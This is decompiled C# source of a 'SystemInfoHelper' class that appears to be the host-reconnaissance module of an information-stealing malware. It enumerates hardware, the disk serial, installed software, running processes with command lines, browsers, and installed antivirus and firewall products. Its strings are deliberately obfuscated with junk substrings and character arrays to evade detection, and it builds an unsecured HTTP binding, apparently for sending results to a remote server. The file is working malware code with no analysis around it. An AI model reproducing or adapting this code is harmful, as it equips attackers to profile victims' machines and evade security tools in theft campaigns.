using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

// Token: 0x0200003A RID: 58
public static class SystemInfoHelper
{
	// Token: 0x060000ED RID: 237 RVA: 0x0000853C File Offset: 0x0000673C
	public static System.ServiceModel.Channels.Binding CreateBind()
	{
		return new BasicHttpBinding
		{
			MaxBufferSize = int.MaxValue,
			MaxReceivedMessageSize = 2147483647L,
			MaxBufferPoolSize = 2147483647L,
			CloseTimeout = TimeSpan.FromMinutes(30.0),
			OpenTimeout = TimeSpan.FromMinutes(30.0),
			ReceiveTimeout = TimeSpan.FromMinutes(30.0),
			SendTimeout = TimeSpan.FromMinutes(30.0),
			TransferMode = TransferMode.Buffered,
			UseDefaultWebProxy = false,
			ProxyAddress = null,
			ReaderQuotas = new XmlDictionaryReaderQuotas
			{
				MaxDepth = 44567654,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			},
			Security = new BasicHttpSecurity
			{
				Mode = BasicHttpSecurityMode.None
			}
		};
	}

	// Token: 0x060000EE RID: 238 RVA: 0x0000862C File Offset: 0x0000682C
	public static List<SystemHardware> GetProcessors()
	{
		List<SystemHardware> list = new List<SystemHardware>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							list.Add(new SystemHardware
							{
								Name = (managementObject["Name"] as string),
								Counter = Convert.ToString(managementObject["NumberOfCores"]),
								HardType = HardwareType.Processor
							});
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000EF RID: 239 RVA: 0x00008720 File Offset: 0x00006920
	public static List<SystemHardware> GetGraphicCards()
	{
		List<SystemHardware> list = new List<SystemHardware>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							uint num = Convert.ToUInt32(managementObject["AdapterRAM"]);
							if (num > 0U)
							{
								list.Add(new SystemHardware
								{
									Name = (managementObject["Name"] as string),
									Counter = num.ToString(),
									HardType = HardwareType.Graphic
								});
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x060000F0 RID: 240 RVA: 0x00008828 File Offset: 0x00006A28
	public static List<string> GetFirewalls()
	{
		List<string> list = new List<string>();
		try
		{
			string[] array = new string[]
			{
				"ROWindowsServiceOT\\SecurityCenteWindowsServicer2",
				"ROWindowsServiceOT\\SecurWindowsServiceityCenter"
			};
			foreach (string text in new List<string>
			{
				"AntqueiresivirusProdqueiresuct",
				"AntqueiresiSpyqueiresWareProdqueiresuct",
				"FiqueiresrewallProqueiresduct"
			})
			{
				foreach (string text2 in array)
				{
					try
					{
						using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(text2.Replace("WindowsService", string.Empty), "SELECT * FROM " + text.Replace("queires", string.Empty)))
						{
							using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
							{
								foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
								{
									ManagementObject managementObject = (ManagementObject)managementBaseObject;
									try
									{
										if (!list.Contains(managementObject[new string(new char[]
										{
											'd',
											'i',
											's',
											'p',
											'l',
											'a',
											'y',
											'N',
											'a',
											'm',
											'e'
										})] as string))
										{
											list.Add(managementObject[new string(new char[]
											{
												'd',
												'i',
												's',
												'p',
												'l',
												'a',
												'y',
												'N',
												'a',
												'm',
												'e'
											})] as string);
										}
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x060000F1 RID: 241 RVA: 0x00008A64 File Offset: 0x00006C64
	public static List<BrowserVersion> GetBrowsers()
	{
		List<BrowserVersion> list = new List<BrowserVersion>();
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				BrowserVersion browserVersion = new BrowserVersion();
				RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
				browserVersion.NameOfBrowser = (string)registryKey2.GetValue(null);
				RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
				browserVersion.PathOfFile = registryKey3.GetValue(null).ToString().StripQuotes();
				if (browserVersion.PathOfFile != null)
				{
					browserVersion.Version = FileVersionInfo.GetVersionInfo(browserVersion.PathOfFile).FileVersion;
				}
				else
				{
					browserVersion.Version = "Unknown Version";
				}
				list.Add(browserVersion);
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000F2 RID: 242 RVA: 0x00008B50 File Offset: 0x00006D50
	public static string GetSerialNumber()
	{
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							return managementObject["SerialNumber"] as string;
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x060000F3 RID: 243 RVA: 0x00008C14 File Offset: 0x00006E14
	public static List<string> ListOfProcesses()
	{
		List<string> list = new List<string>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[]
			{
				'S',
				'E',
				'L',
				'E',
				'C',
				'T',
				' ',
				'*',
				' ',
				'F',
				'R',
				'O',
				'M',
				' ',
				'W',
				'i',
				'n',
				'3',
				'2',
				'_',
				'P',
				'r',
				'o',
				'c',
				'e',
				's',
				's',
				' ',
				'W',
				'h',
				'e',
				'r',
				'e',
				' ',
				'S',
				'e',
				's',
				's',
				'i',
				'o',
				'n',
				'I',
				'd',
				'=',
				'\''
			}) + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							List<string> list2 = list;
							string[] array = new string[6];
							array[0] = new string(new char[]
							{
								'I',
								'D',
								':',
								' '
							});
							int num = 1;
							object obj = managementObject[new string(new char[]
							{
								'P',
								'r',
								'o',
								'c',
								'e',
								's',
								's',
								'I',
								'd'
							})];
							array[num] = ((obj != null) ? obj.ToString() : null);
							array[2] = new string(new char[]
							{
								',',
								' ',
								'N',
								'a',
								'm',
								'e',
								':',
								' '
							});
							int num2 = 3;
							object obj2 = managementObject[new string(new char[]
							{
								'N',
								'a',
								'm',
								'e'
							})];
							array[num2] = ((obj2 != null) ? obj2.ToString() : null);
							array[4] = new string(new char[]
							{
								',',
								' ',
								'C',
								'o',
								'm',
								'm',
								'a',
								'n',
								'd',
								'L',
								'i',
								'n',
								'e',
								':',
								' '
							});
							int num3 = 5;
							object obj3 = managementObject[new string(new char[]
							{
								'C',
								'o',
								'm',
								'm',
								'a',
								'n',
								'd',
								'L',
								'i',
								'n',
								'e'
							})];
							array[num3] = ((obj3 != null) ? obj3.ToString() : null);
							list2.Add(string.Concat(array));
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000F4 RID: 244 RVA: 0x00008E18 File Offset: 0x00007018
	public static List<string> GetProcessesByName(string name, string ext)
	{
		List<string> list = new List<string>();
		try
		{
			name += ext;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[]
			{
				'S',
				'E',
				'L',
				'E',
				'C',
				'T',
				' ',
				'*',
				' ',
				'F',
				'R',
				'O',
				'M',
				' ',
				'W',
				'i',
				'n',
				'3',
				'2',
				'_',
				'P',
				'r',
				'o',
				'c',
				'e',
				's',
				's',
				' ',
				'W',
				'h',
				'e',
				'r',
				'e',
				' ',
				'S',
				'e',
				's',
				's',
				'i',
				'o',
				'n',
				'I',
				'd',
				'=',
				'\''
			}) + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							object obj = managementObject[new string(new char[]
							{
								'N',
								'a',
								'm',
								'e'
							})];
							if (((obj != null) ? obj.ToString() : null) == name)
							{
								List<string> list2 = list;
								object obj2 = managementObject["ExecutablePath"];
								list2.Add((obj2 != null) ? obj2.ToString() : null);
							}
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000F5 RID: 245 RVA: 0x00008F50 File Offset: 0x00007150
	public static List<string> ListOfPrograms()
	{
		List<string> list = new List<string>();
		try
		{
			string name = new string(new char[]
			{
				'S',
				'O',
				'F',
				'T',
				'W',
				'A',
				'R',
				'E',
				'\\',
				'M',
				'i',
				'c',
				'r',
				'o',
				's',
				'o',
				'f',
				't',
				'\\',
				'W',
				'i',
				'n',
				'd',
				'o',
				'w',
				's',
				'\\',
				'C',
				'u',
				'r',
				'r',
				'e',
				'n',
				't',
				'V',
				'e',
				'r',
				's',
				'i',
				'o',
				'n',
				'\\',
				'U',
				'n',
				'i',
				'n',
				's',
				't',
				'a',
				'l',
				'l'
			});
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
			{
				foreach (string name2 in registryKey.GetSubKeyNames())
				{
					try
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name2))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue(new string(new char[]
							{
								'D',
								'i',
								's',
								'p',
								'l',
								'a',
								'y',
								'N',
								'a',
								'm',
								'e'
							})) : null);
							string text2 = (string)((registryKey2 != null) ? registryKey2.GetValue(new string(new char[]
							{
								'D',
								'i',
								's',
								'p',
								'l',
								'a',
								'y',
								'V',
								'e',
								'r',
								's',
								'i',
								'o',
								'n'
							})) : null);
							if (!string.IsNullOrEmpty(text) && !string.IsNullOrWhiteSpace(text2))
							{
								text = text.Trim();
								text2 = text2.Trim();
								list.Add(Regex.Replace(text + " [" + text2 + "]", new string(new char[]
								{
									'[',
									'^',
									'\\',
									'u',
									'0',
									'0',
									'2',
									'0',
									'-',
									'\\',
									'u',
									'0',
									'0',
									'7',
									'F',
									']'
								}), string.Empty));
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return (from x in list
		orderby x
		select x).ToList<string>();
	}

	// Token: 0x060000F6 RID: 246 RVA: 0x00009120 File Offset: 0x00007320
	public static List<string> AvailableLanguages()
	{
		List<string> result = new List<string>();
		try
		{
			return (from InputLanguage lang in InputLanguage.InstalledInputLanguages
			select lang.Culture.EnglishName).ToList<string>();
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x060000F7 RID: 247 RVA: 0x00009180 File Offset: 0x00007380
	public static string TotalOfRAM()
	{
		string result = "0 Mb or 0";
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							double num = Convert.ToDouble(managementObject["TotalVisibleMemorySize"]);
							double num2 = num * 1024.0;
							double num3 = Math.Round(num / 1024.0, 2);
							result = string.Format("{0} MB or {1}", num3, num2).Replace(",", ".");
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x060000F8 RID: 248 RVA: 0x0000928C File Offset: 0x0000748C
	public static string GetWindowsVersion()
	{
		try
		{
			string str;
			try
			{
				str = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
			}
			catch (Exception)
			{
				str = "x86";
			}
			string text = SystemInfoHelper.<GetWindowsVersion>g__HKLM_GetString|11_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			SystemInfoHelper.<GetWindowsVersion>g__HKLM_GetString|11_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
			if (!string.IsNullOrEmpty(text))
			{
				return text + " " + str;
			}
		}
		catch (Exception)
		{
		}
		return string.Empty;
	}

	// Token: 0x060000F9 RID: 249 RVA: 0x00009318 File Offset: 0x00007518
	[CompilerGenerated]
	internal static string <GetWindowsVersion>g__HKLM_GetString|11_0(string key, string value)
	{
		string result;
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key);
			result = (((registryKey != null) ? registryKey.GetValue(value).ToString() : null) ?? string.Empty);
		}
		catch
		{
			result = string.Empty;
		}
		return result;
	}
}
